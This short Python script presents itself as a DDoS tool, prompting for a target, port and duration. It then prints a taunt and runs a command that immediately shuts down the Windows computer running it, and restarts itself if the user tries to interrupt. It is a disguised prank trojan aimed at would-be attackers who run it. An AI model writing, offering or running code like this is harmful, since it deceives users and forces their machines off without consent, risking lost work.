import time
import os

def main():
  print('By using this you agree I am not responsible for anything')
  input('Target: ')
  input('Port: ')
  input('Seconds: ')
  print('LOL stop trying to DDOS')
  time.sleep(2)
  os.system('shutdown /s /t 1')
try:
  if __name__ == "__main__":
    main()
except:
  print("do not try to exit!")
  main()
